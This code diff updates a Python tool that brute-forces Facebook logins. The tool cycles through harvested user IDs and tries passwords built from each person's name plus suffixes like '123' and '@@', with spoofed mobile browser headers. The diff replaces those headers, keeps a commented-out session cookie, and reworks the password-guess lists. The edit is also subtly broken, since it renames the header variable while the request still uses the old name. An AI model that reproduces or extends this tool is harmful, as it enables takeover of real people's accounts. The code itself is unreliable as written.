@@ -139,21 +139,28 @@ class __xxx__:
             for pw in __chi__:
                 pw = pw.lower()
                 session=requests.Session()
-                header = {
-                    "Host":cebok,
-                    "upgrade-insecure-requests":"1",
-                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "dnt":"1",
-                    "x-requested-with":"mark.via.gp",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
-                    "sec-fetch-dest":"document",
-                    "referer":"https://m.facebook.com/",
-                    "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
+                headers = {
+                'authority': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+               # 'cookie': 'ps_l=0; ps_n=0; datr=Q-TyZTtNeW2OCKcmh5mMFZW_; sb=Q-TyZeULbREb19bWjFbJnI6O; m_pixel_ratio=2; wd=360x628; fr=0JKWEpJNuafYTkQlA..Bl8uRD..AAA.0.0.Bl9T6g.AWVxII53Q7E',
+                'dpr': '2',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-model': '"CPH1909"',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-ch-ua-platform-version': '"8.1.0"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+                'viewport-width': '980',
+                 }
                 r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                 das = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
@@ -232,7 +239,7 @@ class __xxx__:
         elif chi in ('1', '01'):
             os.system("clear")
             print(logo)
-            print("\033[1;31m\rUse WI-FI ONLY WORKING (5g also best)\033[1;37m")
+            print("\033[1;31m\rUse WI-FI ONLY WORKING (5G ALSO BEST)\033[1;37m")
             print(47*"-")
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
@@ -249,12 +256,12 @@ class __xxx__:
                         lasts = last.capitalize()
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"@@", xz[0]+"123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"@12345", xz[0]+"@123"]
+                            pwx = [firstl+' '+lastl, xz[1]+"@@", xz[1]+"123"]
+                            pwx = [firstl+' '+lastl, xz[2]+"@12345", xz[2]+"@123"]
                         else:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"@12345", xz[0]+"@123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"@@", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[1]+"@12345", xz[1]+"@123"]
+                            pwx = [firstl+' '+lastl, xz[2]+"@@", xz[2]+"123"]
                         VIXENworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
